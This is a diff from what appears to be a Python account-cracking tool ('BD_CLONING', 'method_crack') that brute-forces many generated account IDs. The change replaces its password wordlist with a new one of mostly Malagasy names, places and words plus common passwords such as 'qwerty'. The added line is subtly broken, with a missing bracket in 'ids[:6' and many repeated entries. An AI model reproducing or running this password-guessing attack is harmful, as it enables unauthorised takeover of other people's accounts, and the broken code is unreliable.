@@ -116,7 +116,17 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:], 'fanantenana','Fanantenana','rakoto','Rakoto','mamiko','Mamiko','Mamako','mamako','mpanety','Mpanety','vadiko','Vadiko','fory','Fory','matory','Matory','vola','Vola','koto','Koto', 'randria', 'Randria', 'Malala', 'malala', 'Malalako', 'malalako', 'nomena', 'Nomena', 'Rakotoarimanana', 'rakotoarimanana', 'Tiako','tiako','Malagasy','malagasy','kiraro','Kiraro','akanjo','mamiko','Mamiko','Akanjo','Nirina','Nounours','nounours','mahamasina','Mahamasina','Fanantenana', 'fitiavana', 'Fitiavana', 'nirina', 'chocolat', 'Chocolat', 'Frite', 'faneva', 'ambatobe', 'Ambatobe', 'nomenjanahary', 'Nomenjanahary', 'sambatra', 'Sambatra', 'antsa', 'Antsa', 'mitsiky', 'Mitsiky', 'nantenaina', 'Nantenaina', 'Madagasikara', 'madagasikara', 'anjara', 'Anjara', 'maman', 'Maman', 'Ankatso', 'ankatso', 'fandresena', 'Fandresena', 'Mofo akondro', 'cntemad', 'CNTEMAD', 'Ambodivona', 'njaka', 'antananarivo', 'Antananarivo', 'malagasy', 'Malagasy', 'Andriamanantena', 'andriamanantena', 'sitraka', 'Sitraka', 'Koloina', 'koloina' , 'karoty']
+            passlist=[psx,ids,ids[:6,ids[:6],ids[5:],ids[6:],'fanantenana','Fanantenana','mamako','Mamako','nirina','Nirina','mamiko','Mamiko','malala','Malala','malalako','Malalako','malagasy','Malagasy','malala','fitiavana','mamako','malalako','mamiko','badoda','mendrika', 'antananarivo','Antananarivo','marary','milely','taimbo','hanitra',  'vadiko','jesosy','mahery','malagasy','Malagasy','henintsoa','mahaleo','hanitra',
+                       'vadiko','jesosy','mahery','malagasy','Malagasy','henintsoa','mahaleo',
+                       'miangaly','nomena','nantenaina','fanantenana','sarobidy','fanomezana',
+                       'fanomezantsoa','dadatoa','tsiory','tsiaro','bonjour','madagasikara',
+                       'tiavima','boxeur','jacque','titanic','qwerty','azerty','papasosy',
+                       'mamasossy','tahiana','tantely','tanora','felana','tsilavina',
+                       'nekena','finoana','fanantenana','harena','anjara','vololona',
+                       'liantsoa','tanjona','fifaliana','je t\'aime','fanomezana','narindra',
+                       'mirindra','lalaina','voahangy','iharitiana','mamisoa','mamatsoa',
+                       'sitraka','herilaza','herilaza','cedrick','nasaina','nandrianina',
+                       'tafita','safidy','fenosoa','domoina','hasina','nilaina'] 
             Dipto.submit(method_crack,ids,passlist)
             
     linex()
